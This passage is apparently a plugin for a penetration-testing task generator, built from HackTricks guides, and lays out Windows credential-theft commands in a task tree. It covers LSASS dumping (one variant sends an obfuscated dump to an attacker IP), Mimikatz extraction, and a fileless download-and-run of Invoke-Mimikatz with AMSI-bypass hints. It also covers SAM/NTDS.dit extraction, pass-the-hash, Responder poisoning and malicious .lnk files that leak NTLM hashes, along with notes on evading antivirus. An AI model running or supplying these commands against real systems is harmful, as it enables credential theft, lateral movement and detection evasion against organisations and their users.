"""
Windows Credential Theft plugin

Generates tasks for Windows credential theft and NTLM attacks including:
- Mimikatz credential dumping (LSASS, SAM, NTDS)
- LSASS memory dump techniques
- SAM/SYSTEM extraction methods
- Credential protection bypasses (PPL, Credential Guard)
- NTLM relay attacks
- NTLM theft techniques (coercion, file-based)
- Pass-the-hash attacks
- Internal Monologue attacks
- WTS Impersonator token hijacking

Extracted from HackTricks Windows credential theft guides
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class CredentialTheftPlugin(ServicePlugin):
    """Windows credential theft and NTLM attack plugin"""

    @property
    def name(self) -> str:
        return "credential-theft"

    @property
    def default_ports(self) -> List[int]:
        return []  # Manual trigger, no port detection

    @property
    def service_names(self) -> List[str]:
        return ['credential-theft', 'cred-theft', 'ntlm-theft']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Manual trigger only - returns False"""
        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Windows credential theft task tree"""

        tasks = {
            'id': 'credential-theft-root',
            'name': f'Windows Credential Theft: {target}',
            'type': 'parent',
            'children': []
        }

        # PHASE 1: LSASS Memory Dumping
        lsass_tasks = {
            'id': 'lsass-dumping',
            'name': 'LSASS Memory Dumping',
            'type': 'parent',
            'children': []
        }

        # 1.1: Procdump (Microsoft signed, AV-friendly)
        lsass_tasks['children'].append({
            'id': 'lsass-procdump',
            'name': 'Dump LSASS with Procdump',
            'type': 'command',
            'metadata': {
                'command': f'procdump.exe -accepteula -ma lsass.exe lsass.dmp',
                'description': 'Dump LSASS memory using Microsoft Sysinternals tool (AV-friendly)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    '-accepteula': 'Accept EULA automatically (no prompt)',
                    '-ma': 'Write full memory dump with all accessible memory',
                    'lsass.exe': 'Target process (Local Security Authority Subsystem)',
                    'lsass.dmp': 'Output dump file'
                },
                'success_indicators': [
                    'Dump written successfully',
                    'lsass.dmp file created (usually 50-200MB)',
                    'No AV alerts (procdump is Microsoft signed)'
                ],
                'failure_indicators': [
                    'Access denied - need admin/SYSTEM privileges',
                    'LSA Protection (RunAsPPL) enabled - use PPL bypass',
                    'AV detects lsass.exe string - use PID instead'
                ],
                'next_steps': [
                    'Download lsass.dmp to attacker machine',
                    'Extract credentials: mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"',
                    'Alternative: use pypykatz for offline parsing'
                ],
                'alternatives': [
                    'Get lsass PID: Get-Process -Name lsass',
                    'Use PID instead: procdump.exe -accepteula -ma <PID> lsass.dmp',
                    'Remote: \\\\live.sysinternals.com\\tools\\procdump.exe -accepteula -ma lsass.exe lsass.dmp',
                    'Bypass detection: Pass PID instead of process name'
                ],
                'notes': 'Procdump is Microsoft-signed and less likely to trigger AV. Passing PID instead of "lsass.exe" bypasses string-based detection.'
            }
        })

        # 1.2: comsvcs.dll (native Windows DLL)
        lsass_tasks['children'].append({
            'id': 'lsass-comsvcs',
            'name': 'Dump LSASS with comsvcs.dll',
            'type': 'command',
            'metadata': {
                'command': f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <LSASS_PID> lsass.dmp full',
                'description': 'Native Windows DLL for crash dumps - no upload needed',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    'rundll32.exe': 'Execute function from DLL',
                    'comsvcs.dll': 'Component Services DLL with MiniDump function',
                    'MiniDump': 'Function to dump process memory',
                    '<LSASS_PID>': 'Process ID of lsass.exe (get with tasklist)',
                    'full': 'Full dump (required third argument)'
                },
                'success_indicators': [
                    'lsass.dmp created in current directory',
                    'File size 50-200MB',
                    'No error messages'
                ],
                'failure_indicators': [
                    'Invalid parameter - check PID is correct',
                    'Access denied - need SYSTEM context',
                    'PPL protection enabled'
                ],
                'next_steps': [
                    'Get LSASS PID: tasklist | findstr lsass',
                    'Download dump file',
                    'Parse offline with mimikatz or pypykatz'
                ],
                'alternatives': [
                    'Task Manager: Right-click lsass.exe → Create dump file',
                    'Use lssasy tool for automation: lsassy -d DOMAIN -u USER -p PASS target',
                    'PowerShell: Out-Minidump from PowerSploit'
                ],
                'notes': 'Native Windows method, no file upload needed. Detailed at: https://en.hackndo.com/remote-lsass-dump-passwords/'
            }
        })

        # 1.3: Task Manager (GUI method)
        lsass_tasks['children'].append({
            'id': 'lsass-taskmanager',
            'name': 'Dump LSASS via Task Manager (GUI)',
            'type': 'manual',
            'metadata': {
                'command': 'Manual GUI steps',
                'description': 'Simple GUI method when RDP access available',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'QUICK_WIN'],
                'flag_explanations': {},
                'success_indicators': [
                    'Dump file created in C:\\Users\\<USER>\\AppData\\Local\\Temp',
                    'File named lsass.DMP or similar'
                ],
                'failure_indicators': [
                    'Access denied dialog',
                    'PPL protection prevents dump'
                ],
                'next_steps': [
                    'Download dump from %LOCALAPPDATA%\\Temp',
                    'Parse with mimikatz offline'
                ],
                'alternatives': [
                    'procdump.exe -ma lsass.exe lsass.dmp',
                    'rundll32.exe comsvcs.dll MiniDump'
                ],
                'notes': 'Steps: Right-click taskbar → Task Manager → Details tab → Find "Local Security Authority Process" → Right-click → Create dump file'
            }
        })

        # 1.4: PPLBlade (bypass PPL protection)
        lsass_tasks['children'].append({
            'id': 'lsass-pplblade',
            'name': 'Dump LSASS with PPL Bypass (PPLBlade)',
            'type': 'command',
            'metadata': {
                'command': f'PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip <ATTACKER_IP> --port 1234',
                'description': 'Bypass Protected Process Light (PPL) and exfiltrate obfuscated dump over network',
                'tags': ['OSCP:MEDIUM', 'ADVANCED', 'PPL_BYPASS'],
                'flag_explanations': {
                    '--mode dump': 'Dump process memory',
                    '--name lsass.exe': 'Target LSASS process',
                    '--handle procexp': 'Use Process Explorer driver handle technique',
                    '--obfuscate': 'Obfuscate dump to evade AV signature detection',
                    '--dumpmode network': 'Send dump over network (fileless)',
                    '--network raw': 'Raw TCP transfer',
                    '--ip': 'Attacker IP to receive dump',
                    '--port': 'Listener port'
                },
                'success_indicators': [
                    'PPL protection bypassed',
                    'Dump transferred over network',
                    'No disk artifacts'
                ],
                'failure_indicators': [
                    'Driver load failed',
                    'Kernel protection prevents bypass',
                    'Network connection blocked'
                ],
                'next_steps': [
                    'Listen on attacker: nc -lvnp 1234 > lsass.dmp',
                    'Deobfuscate dump if needed',
                    'Parse with mimikatz'
                ],
                'alternatives': [
                    'Use Mimikatz mimidrv.sys: mimikatz "!+" "!processprotect /process:lsass.exe /remove"',
                    'PPLKiller: https://github.com/RedCursorSecurityConsulting/PPLKiller',
                    'Handle duplication: pypykatz live lsa --method handledup'
                ],
                'notes': 'Requires vulnerable driver or kernel exploit. PPLBlade: https://github.com/tastypepperoni/PPLBlade'
            }
        })

        tasks['children'].append(lsass_tasks)

        # PHASE 2: Mimikatz Credential Extraction
        mimikatz_tasks = {
            'id': 'mimikatz-extraction',
            'name': 'Mimikatz Credential Extraction',
            'type': 'parent',
            'children': []
        }

        # 2.1: Live LSASS extraction
        mimikatz_tasks['children'].append({
            'id': 'mimikatz-logonpasswords',
            'name': 'Extract Credentials from Live LSASS',
            'type': 'command',
            'metadata': {
                'command': 'mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"',
                'description': 'Extract plaintext passwords and hashes from live LSASS memory',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'AUTOMATED'],
                'flag_explanations': {
                    'privilege::debug': 'Acquire SeDebugPrivilege (required for LSASS access)',
                    'token::elevate': 'Elevate to SYSTEM token',
                    'sekurlsa::logonpasswords': 'Extract credentials from LSASS memory'
                },
                'success_indicators': [
                    'Credentials displayed (NTLM hashes, Kerberos tickets)',
                    'Multiple user sessions shown',
                    'WDigest plaintext passwords (if enabled)'
                ],
                'failure_indicators': [
                    'ERROR kuhl_m_privilege_simple: privilege::debug - 0x5 (Access denied)',
                    'Credential Guard enabled - no cleartext/NTLM',
                    'PPL protection - 0x5 Access Denied'
                ],
                'next_steps': [
                    'Save NTLM hashes for Pass-the-Hash',
                    'Save Kerberos tickets: sekurlsa::tickets /export',
                    'Check for plaintext passwords (WDigest)'
                ],
                'alternatives': [
                    'PowerShell: Invoke-Mimikatz -Command "sekurlsa::logonpasswords"',
                    'Dump and parse offline: procdump + minidump',
                    'pypykatz: pypykatz live lsa'
                ],
                'notes': 'Requires admin privileges. Often detected by AV/EDR. Consider dump + offline parsing.'
            }
        })

        # 2.2: Dump from offline file
        mimikatz_tasks['children'].append({
            'id': 'mimikatz-minidump',
            'name': 'Parse Offline LSASS Dump',
            'type': 'command',
            'metadata': {
                'command': 'mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"',
                'description': 'Extract credentials from LSASS dump file (offline analysis)',
                'tags': ['OSCP:HIGH', 'MANUAL', 'OPSEC_SAFE'],
                'flag_explanations': {
                    'sekurlsa::minidump': 'Load minidump file instead of live LSASS',
                    'lsass.dmp': 'Dump file created with procdump/comsvcs',
                    'sekurlsa::logonpasswords': 'Parse credentials from dump'
                },
                'success_indicators': [
                    'Credentials extracted from dump',
                    'NTLM hashes recovered',
                    'Kerberos keys displayed'
                ],
                'failure_indicators': [
                    'Corrupted dump file',
                    'Dump from different architecture',
                    'Credential protections were active'
                ],
                'next_steps': [
                    'Document all credentials found',
                    'Test hashes with Pass-the-Hash',
                    'Crack NTLM hashes: hashcat -m 1000'
                ],
                'alternatives': [
                    'pypykatz: pypykatz lsa minidump lsass.dmp',
                    'secretsdump.py: impacket-secretsdump -sam SAM -system SYSTEM LOCAL'
                ],
                'notes': 'Offline parsing avoids AV detection on target. Can be done on attacker machine.'
            }
        })

        # 2.3: One-liner for all credential sources
        mimikatz_tasks['children'].append({
            'id': 'mimikatz-all',
            'name': 'Extract All Credentials (One-liner)',
            'type': 'command',
            'metadata': {
                'command': 'mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"',
                'description': 'Comprehensive credential dump from all sources (LSASS, SAM, LSA, Cache)',
                'tags': ['OSCP:HIGH', 'COMPREHENSIVE'],
                'flag_explanations': {
                    'sekurlsa::logonpasswords': 'Extract from LSASS memory',
                    'lsadump::lsa /inject': 'Extract LSA secrets via injection',
                    'lsadump::sam': 'Dump SAM database hashes',
                    'lsadump::cache': 'Dump cached domain credentials',
                    'sekurlsa::ekeys': 'Extract Kerberos encryption keys'
                },
                'success_indicators': [
                    'Multiple credential types extracted',
                    'SAM hashes dumped',
                    'Cached credentials retrieved'
                ],
                'failure_indicators': [
                    'Partial failures on protected sources',
                    'AV detects multiple operations'
                ],
                'next_steps': [
                    'Organize credentials by type',
                    'Test each hash/credential',
                    'Document in OSCP report with sources'
                ],
                'alternatives': [
                    'Separate commands for stealth',
                    'Use CrackMapExec for remote dumping',
                    'Meterpreter: load kiwi; creds_all'
                ],
                'notes': 'Comprehensive but noisy. Use for lab/CTF. In production, extract only what you need.'
            }
        })

        # 2.4: Invoke-Mimikatz (PowerShell)
        mimikatz_tasks['children'].append({
            'id': 'invoke-mimikatz',
            'name': 'Invoke-Mimikatz (PowerShell)',
            'type': 'command',
            'metadata': {
                'command': 'IEX (New-Object System.Net.Webclient).DownloadString("https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -DumpCreds',
                'description': 'Load and execute Mimikatz from memory via PowerShell (fileless)',
                'tags': ['OSCP:HIGH', 'FILELESS', 'AUTOMATED'],
                'flag_explanations': {
                    'IEX': 'Invoke-Expression - execute downloaded script',
                    'DownloadString': 'Fetch script from URL into memory',
                    '-DumpCreds': 'Dump credentials from memory'
                },
                'success_indicators': [
                    'Script loaded without disk write',
                    'Credentials extracted',
                    'Output in PowerShell console'
                ],
                'failure_indicators': [
                    'AMSI blocks download',
                    'Constrained Language Mode prevents execution',
                    'Network access blocked'
                ],
                'next_steps': [
                    'Copy credentials before closing shell',
                    'Test extracted hashes'
                ],
                'alternatives': [
                    'Host script locally: python3 -m http.server 8000',
                    'Use encoded command: -EncodedCommand <BASE64>',
                    'Bypass AMSI first: [Ref].Assembly.GetType(...).GetField(...).SetValue(...)'
                ],
                'notes': 'Fileless = no disk artifacts. AMSI may block. Consider AMSI bypass first.'
            }
        })

        tasks['children'].append(mimikatz_tasks)

        # PHASE 3: SAM/SYSTEM Extraction
        sam_tasks = {
            'id': 'sam-system-extraction',
            'name': 'SAM/SYSTEM Database Extraction',
            'type': 'parent',
            'children': []
        }

        # 3.1: Registry save method
        sam_tasks['children'].append({
            'id': 'sam-reg-save',
            'name': 'Extract SAM/SYSTEM via Registry',
            'type': 'command',
            'metadata': {
                'command': 'reg save HKLM\\sam sam && reg save HKLM\\system system && reg save HKLM\\security security',
                'description': 'Export SAM, SYSTEM, and SECURITY registry hives (requires admin)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    'reg save': 'Save registry hive to file',
                    'HKLM\\sam': 'SAM database with password hashes',
                    'HKLM\\system': 'SYSTEM hive with BOOTKEY (needed to decrypt SAM)',
                    'HKLM\\security': 'SECURITY hive with LSA secrets'
                },
                'success_indicators': [
                    'Three files created: sam, system, security',
                    'Each file several MB',
                    'No errors'
                ],
                'failure_indicators': [
                    'Access denied - need admin privileges',
                    'Files in use - reboot to safe mode or use VSS'
                ],
                'next_steps': [
                    'Download files to attacker machine',
                    'Extract hashes: secretsdump.py -sam sam -security security -system system LOCAL',
                    'Alternative: samdump2 SYSTEM SAM'
                ],
                'alternatives': [
                    'Volume Shadow Copy: see VSS method below',
                    'Invoke-NinjaCopy: bypass file locks',
                    'CrackMapExec: cme smb <target> -u USER -p PASS --sam'
                ],
                'notes': 'Easiest local method. Files located at C:\\Windows\\System32\\config but are locked when system running.'
            }
        })

        # 3.2: Volume Shadow Copy (VSS)
        sam_tasks['children'].append({
            'id': 'sam-vss',
            'name': 'Extract SAM via Volume Shadow Copy',
            'type': 'command',
            'metadata': {
                'command': 'vssadmin create shadow /for=C: && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\SAM C:\\temp\\SAM && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\SYSTEM C:\\temp\\SYSTEM',
                'description': 'Use Volume Shadow Copy Service to copy locked SAM/SYSTEM files',
                'tags': ['OSCP:HIGH', 'ADVANCED', 'WINDOWS_SERVER'],
                'flag_explanations': {
                    'vssadmin create shadow': 'Create shadow copy of volume',
                    '/for=C:': 'Target C: drive',
                    'HarddiskVolumeShadowCopy1': 'First shadow copy (check vssadmin list shadows)',
                    '\\\\?\\GLOBALROOT\\Device': 'Device namespace for shadow copies'
                },
                'success_indicators': [
                    'Shadow copy created successfully',
                    'SAM and SYSTEM files copied',
                    'Files are readable'
                ],
                'failure_indicators': [
                    'vssadmin not available (Windows workstation)',
                    'Insufficient disk space',
                    'VSS service not running'
                ],
                'next_steps': [
                    'List shadows: vssadmin list shadows',
                    'Delete shadow: vssadmin delete shadows /shadow=<ID>',
                    'Parse with secretsdump.py'
                ],
                'alternatives': [
                    'PowerShell VSS method: see PowerShell script below',
                    'Invoke-NinjaCopy: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1',
                    'symlink method: mklink /d c:\\shadowcopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\'
                ],
                'notes': 'vssadmin only on Windows Server. Workstations need PowerShell VSS method or Invoke-NinjaCopy.'
            }
        })

        # 3.3: Parse SAM files
        sam_tasks['children'].append({
            'id': 'sam-parse',
            'name': 'Parse SAM/SYSTEM Files',
            'type': 'command',
            'metadata': {
                'command': 'impacket-secretsdump -sam sam -security security -system system LOCAL',
                'description': 'Extract password hashes from SAM database files',
                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                'flag_explanations': {
                    '-sam': 'SAM database file',
                    '-security': 'SECURITY hive file',
                    '-system': 'SYSTEM hive (contains BOOTKEY)',
                    'LOCAL': 'Parse local files (not remote)'
                },
                'success_indicators': [
                    'NTLM hashes displayed for local users',
                    'Format: username:RID:LM:NTLM:::',
                    'Administrator hash present'
                ],
                'failure_indicators': [
                    'Invalid SYSTEM file',
                    'Files from different machines',
                    'Corrupted registry hives'
                ],
                'next_steps': [
                    'Save hashes to file',
                    'Crack with hashcat: hashcat -m 1000 hashes.txt rockyou.txt',
                    'Use for Pass-the-Hash attacks'
                ],
                'alternatives': [
                    'samdump2 SYSTEM SAM',
                    'mimikatz: lsadump::sam /sam:sam /system:system'
                ],
                'notes': 'LM hash AAD3B435B51404EEAAD3B435B51404EE means LM not used (empty). Focus on NTLM hashes.'
            }
        })

        tasks['children'].append(sam_tasks)

        # PHASE 4: NTDS.dit (Active Directory)
        ntds_tasks = {
            'id': 'ntds-extraction',
            'name': 'NTDS.dit Extraction (Domain Controller)',
            'type': 'parent',
            'children': []
        }

        # 4.1: Ntdsutil method
        ntds_tasks['children'].append({
            'id': 'ntds-ntdsutil',
            'name': 'Extract NTDS.dit with Ntdsutil',
            'type': 'command',
            'metadata': {
                'command': 'ntdsutil "ac i ntds" "ifm" "create full c:\\temp\\ntds-copy" quit quit',
                'description': 'Official Microsoft tool to create NTDS.dit snapshot (requires DC admin)',
                'tags': ['OSCP:HIGH', 'DOMAIN_ADMIN', 'ACTIVE_DIRECTORY'],
                'flag_explanations': {
                    'ac i ntds': 'Activate instance NTDS',
                    'ifm': 'Install From Media mode',
                    'create full': 'Create full backup including NTDS.dit',
                    'c:\\temp\\ntds-copy': 'Destination directory'
                },
                'success_indicators': [
                    'IFM media created successfully',
                    'ntds.dit file in destination',
                    'SYSTEM hive also created'
                ],
                'failure_indicators': [
                    'Access denied - need Domain Admin',
                    'Not on Domain Controller',
                    'Insufficient disk space'
                ],
                'next_steps': [
                    'Files located in: c:\\temp\\ntds-copy\\Active Directory\\ntds.dit',
                    'SYSTEM at: c:\\temp\\ntds-copy\\registry\\SYSTEM',
                    'Parse: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL'
                ],
                'alternatives': [
                    'Volume Shadow Copy method',
                    'CrackMapExec: cme smb <DC> -u USER -p PASS --ntds',
                    'Remote: secretsdump.py DOMAIN/USER@DC'
                ],
                'notes': 'Available since Windows Server 2008. Creates full backup - legitimate admin task but suspicious if unauthorized.'
            }
        })

        # 4.2: secretsdump remote
        ntds_tasks['children'].append({
            'id': 'ntds-secretsdump-remote',
            'name': 'Remote NTDS Extraction (secretsdump)',
            'type': 'command',
            'metadata': {
                'command': 'impacket-secretsdump -just-dc-ntlm DOMAIN/USER:PASSWORD@<DC_IP>',
                'description': 'Remotely dump domain credentials via DCSync (requires Domain Admin or DCSync rights)',
                'tags': ['OSCP:HIGH', 'DOMAIN_ADMIN', 'REMOTE'],
                'flag_explanations': {
                    '-just-dc-ntlm': 'Only dump NTLM hashes (faster)',
                    'DOMAIN/USER:PASSWORD': 'Domain admin credentials',
                    '@<DC_IP>': 'Domain Controller IP address'
                },
                'success_indicators': [
                    'All domain user hashes dumped',
                    'krbtgt hash retrieved',
                    'Computer account hashes shown'
                ],
                'failure_indicators': [
                    'Access denied - need replication rights',
                    'Network connection failed',
                    'RPC server unavailable'
                ],
                'next_steps': [
                    'Save all hashes: -outputfile domain_hashes.txt',
                    'Extract krbtgt for Golden Ticket',
                    'Crack high-value hashes'
                ],
                'alternatives': [
                    'Mimikatz DCSync: lsadump::dcsync /user:DOMAIN\\krbtgt',
                    'CrackMapExec: cme smb <DC> -u USER -p PASS --ntds',
                    'Use hash instead: -hashes :NTLM'
                ],
                'notes': 'DCSync requires Replicating Directory Changes rights (default for Domain Admins). Stealthy - appears as legitimate DC replication.'
            }
        })

        # 4.3: CrackMapExec NTDS
        ntds_tasks['children'].append({
            'id': 'ntds-crackmapexec',
            'name': 'CrackMapExec NTDS Dump',
            'type': 'command',
            'metadata': {
                'command': f'crackmapexec smb {target} -u USERNAME -p PASSWORD --ntds',
                'description': 'Automated NTDS.dit dump using CrackMapExec (with VSS)',
                'tags': ['OSCP:HIGH', 'AUTOMATED', 'DOMAIN_ADMIN'],
                'flag_explanations': {
                    'smb': 'Use SMB protocol',
                    '-u USERNAME': 'Domain admin username',
                    '-p PASSWORD': 'Password (or -H <HASH> for PTH)',
                    '--ntds': 'Dump NTDS.dit database'
                },
                'success_indicators': [
                    'NTDS.dit dumped successfully',
                    'Hashes saved to ~/.cme/logs',
                    'All domain credentials extracted'
                ],
                'failure_indicators': [
                    'VSS error',
                    'Access denied',
                    'Network timeout'
                ],
                'next_steps': [
                    'Check logs: ~/.cme/logs',
                    'Extract specific users',
                    'Test hashes'
                ],
                'alternatives': [
                    'With VSS: cme smb <DC> -u USER -p PASS --ntds vss',
                    'Password history: --ntds-history',
                    'pwdLastSet: --ntds-pwdLastSet'
                ],
                'notes': 'CrackMapExec automates VSS creation and cleanup. Logs stored locally.'
            }
        })

        tasks['children'].append(ntds_tasks)

        # PHASE 5: Pass-the-Hash
        pth_tasks = {
            'id': 'pass-the-hash',
            'name': 'Pass-the-Hash Attacks',
            'type': 'parent',
            'children': []
        }

        # 5.1: Mimikatz PTH
        pth_tasks['children'].append({
            'id': 'pth-mimikatz',
            'name': 'Pass-the-Hash with Mimikatz',
            'type': 'command',
            'metadata': {
                'command': 'mimikatz.exe "sekurlsa::pth /user:username /domain:domain.local /ntlm:<NTLM_HASH> /run:powershell.exe"',
                'description': 'Inject NTLM hash into LSASS and spawn authenticated process',
                'tags': ['OSCP:HIGH', 'LATERAL_MOVEMENT'],
                'flag_explanations': {
                    'sekurlsa::pth': 'Pass-the-Hash function',
                    '/user:username': 'Username to impersonate',
                    '/domain:domain.local': 'Target domain',
                    '/ntlm:<HASH>': 'NTLM hash (no LM needed)',
                    '/run:powershell.exe': 'Process to spawn with injected hash'
                },
                'success_indicators': [
                    'New PowerShell window opens',
                    'Can access network resources as target user',
                    'whoami shows current user but network auth uses hash'
                ],
                'failure_indicators': [
                    'Mimikatz fails to inject',
                    'Spawned process has no network access',
                    'AV blocks execution'
                ],
                'next_steps': [
                    'Test access: dir \\\\<TARGET>\\c$',
                    'Run commands: psexec, wmiexec',
                    'Dump more credentials from remote systems'
                ],
                'alternatives': [
                    'Invoke-Mimikatz -Command "sekurlsa::pth ..."',
                    'Linux PTH: impacket-psexec -hashes :NTLM DOMAIN/USER@TARGET',
                    'CrackMapExec: cme smb <target> -u USER -H <HASH>'
                ],
                'notes': 'Similar to runas /netonly but with hash instead of password. Local token unchanged, network authentication uses hash.'
            }
        })

        # 5.2: Impacket PTH
        pth_tasks['children'].append({
            'id': 'pth-impacket',
            'name': 'Pass-the-Hash with Impacket (Linux)',
            'type': 'command',
            'metadata': {
                'command': f'impacket-psexec -hashes :<NTLM_HASH> DOMAIN/USER@{target}',
                'description': 'Execute commands on Windows from Linux using NTLM hash',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'LINUX'],
                'flag_explanations': {
                    '-hashes': 'Provide LM:NTLM hashes (LM can be empty)',
                    ':<NTLM_HASH>': 'Format is LM:NTLM, use :HASH if no LM',
                    'DOMAIN/USER': 'Domain and username',
                    '@<target>': 'Target machine'
                },
                'success_indicators': [
                    'SYSTEM shell obtained',
                    'C:\\Windows\\system32> prompt',
                    'Commands execute successfully'
                ],
                'failure_indicators': [
                    'STATUS_LOGON_FAILURE - invalid hash',
                    'Connection refused - SMB blocked',
                    'Access denied - insufficient privileges'
                ],
                'next_steps': [
                    'Upload tools',
                    'Dump credentials: reg save',
                    'Pivot to other systems'
                ],
                'alternatives': [
                    'impacket-wmiexec -hashes :HASH DOMAIN/USER@target (less noisy)',
                    'impacket-smbexec -hashes :HASH DOMAIN/USER@target',
                    'impacket-atexec -hashes :HASH DOMAIN/USER@target "command"',
                    'evil-winrm -i <target> -u USER -H <HASH>'
                ],
                'notes': 'Computer account hashes also work. psexec creates service (noisy), wmiexec uses WMI (stealthier).'
            }
        })

        # 5.3: CrackMapExec PTH
        pth_tasks['children'].append({
            'id': 'pth-crackmapexec',
            'name': 'Pass-the-Hash with CrackMapExec',
            'type': 'command',
            'metadata': {
                'command': f'crackmapexec smb {target} -u USERNAME -H <NTLM_HASH> -x "whoami"',
                'description': 'Spray NTLM hash across multiple targets',
                'tags': ['OSCP:HIGH', 'AUTOMATED', 'LATERAL_MOVEMENT'],
                'flag_explanations': {
                    'smb': 'Protocol (also: winrm, mssql, ldap)',
                    '-u USERNAME': 'Username',
                    '-H <HASH>': 'NTLM hash',
                    '-x "command"': 'Execute command'
                },
                'success_indicators': [
                    '[+] DOMAIN\\USER:hash (Pwn3d!)',
                    'Command output shown',
                    'Multiple targets compromised'
                ],
                'failure_indicators': [
                    '[-] Authentication failed',
                    'STATUS_LOGON_FAILURE',
                    'Connection errors'
                ],
                'next_steps': [
                    'Dump SAM: --sam',
                    'Dump LSA: --lsa',
                    'Execute implant: -x "powershell -enc ..."'
                ],
                'alternatives': [
                    'Target list: cme smb targets.txt -u USER -H HASH',
                    'Local auth: --local-auth',
                    'Module execution: -M <module>'
                ],
                'notes': 'Excellent for lateral movement. Test single target first before mass spray. Pwn3d! = admin access.'
            }
        })

        tasks['children'].append(pth_tasks)

        # PHASE 6: NTLM Relay/Theft
        ntlm_relay_tasks = {
            'id': 'ntlm-relay-theft',
            'name': 'NTLM Relay & Credential Theft',
            'type': 'parent',
            'children': []
        }

        # 6.1: Responder + ntlmrelayx
        ntlm_relay_tasks['children'].append({
            'id': 'ntlm-relay-responder',
            'name': 'NTLM Relay with Responder',
            'type': 'command',
            'metadata': {
                'command': f'sudo responder -I eth0 -wv',
                'description': 'Capture NTLM hashes via LLMNR/NBT-NS poisoning',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'NETWORK'],
                'flag_explanations': {
                    '-I eth0': 'Network interface',
                    '-w': 'Start WPAD rogue proxy server',
                    '-v': 'Verbose output'
                },
                'success_indicators': [
                    '[+] Listening for events...',
                    'NetNTLMv2 hashes captured',
                    'Hashes saved to /usr/share/responder/logs'
                ],
                'failure_indicators': [
                    'No authentication attempts',
                    'SMB signing prevents relay',
                    'Capture timeout'
                ],
                'next_steps': [
                    'Crack hashes: hashcat -m 5600 hashes.txt rockyou.txt',
                    'Relay instead: ntlmrelayx.py -tf targets.txt -smb2support',
                    'Downgrade to NTLMv1: responder --lm'
                ],
                'alternatives': [
                    'Inveigh (Windows PowerShell version)',
                    'mitm6 for IPv6 attacks',
                    'ntlmrelayx.py for relay instead of capture'
                ],
                'notes': 'NetNTLMv2 != NTLM hash. Must crack to get NTLM. For NTLMv1, use crack.sh or ntlmv1.com. Relay is often more valuable than cracking.'
            }
        })

        # 6.2: File-based NTLM theft
        ntlm_relay_tasks['children'].append({
            'id': 'ntlm-theft-files',
            'name': 'NTLM Theft via Malicious Files',
            'type': 'parent',
            'children': [
                {
                    'id': 'ntlm-theft-lnk',
                    'name': 'Create Malicious .lnk File',
                    'type': 'command',
                    'metadata': {
                        'command': f'echo "[InternetShortcut]" > @test.lnk && echo "URL=file://{target}/share/file" >> @test.lnk',
                        'description': 'Windows shortcut that leaks NTLM when icon is loaded',
                        'tags': ['OSCP:MEDIUM', 'PHISHING', 'FILE_BASED'],
                        'flag_explanations': {
                            'InternetShortcut': 'Windows .lnk file format',
                            'URL=file://': 'UNC path to attacker SMB share',
                            '@test.lnk': '@ prefix forces to top of directory listing'
                        },
                        'success_indicators': [
                            'File created',
                            'Hash captured when victim opens folder',
                            'No click required (automatic icon load)'
                        ],
                        'failure_indicators': [
                            'Victim has network restrictions',
                            'SMB outbound blocked'
                        ],
                        'next_steps': [
                            'Place in writable share',
                            'Listen with Responder',
                            'Wait for hash capture'
                        ],
                        'alternatives': [
                            'Use ntlm_theft tool for all file types',
                            '.scf files (similar to .lnk)',
                            '.library-ms files in ZIP (CVE-2025-24071)'
                        ],
                        'notes': 'NTLM hash sent when Explorer loads icon. No user interaction needed. Place in frequently-accessed shares.'
                    }
                },
                {
                    'id': 'ntlm-theft-library-ms',
                    'name': 'ZIP-embedded .library-ms (CVE-2025-24071)',
                    'type': 'command',
                    'metadata': {
                        'command': 'Create .library-ms with UNC path, add to ZIP, send to victim',
                        'description': 'Windows library file in ZIP leaks NTLM when opened from archive',
                        'tags': ['OSCP:MEDIUM', 'CVE', 'PHISHING'],
                        'flag_explanations': {},
                        'success_indicators': [
                            'NetNTLMv2 hash captured',
                            'Triggered by opening .library-ms inside ZIP',
                            'No extraction required'
                        ],
                        'failure_indicators': [
                            'Windows patched (post-CVE-2025-24071)',
                            'User extracts file first (no longer works)'
                        ],
                        'next_steps': [
                            'Crack captured hash',
                            'Relay to other systems if SMB signing disabled'
                        ],
                        'alternatives': [
                            '.lnk files',
                            '.scf files',
                            'Windows Media Player .asx playlists'
                        ],
                        'notes': 'XML format library file pointing to UNC path. Recent CVE (2025). Reference: https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html'
                    }
                },
                {
                    'id': 'ntlm-theft-wmp',
                    'name': 'Windows Media Player Playlist (.asx)',
                    'type': 'command',
                    'metadata': {
                        'command': 'Create .asx file with UNC path to media file',
                        'description': 'WMP playlist leaks NTLM when opened or previewed',
                        'tags': ['OSCP:MEDIUM', 'FILE_BASED'],
                        'flag_explanations': {},
                        'success_indicators': [
                            'NetNTLMv2 captured when victim opens playlist',
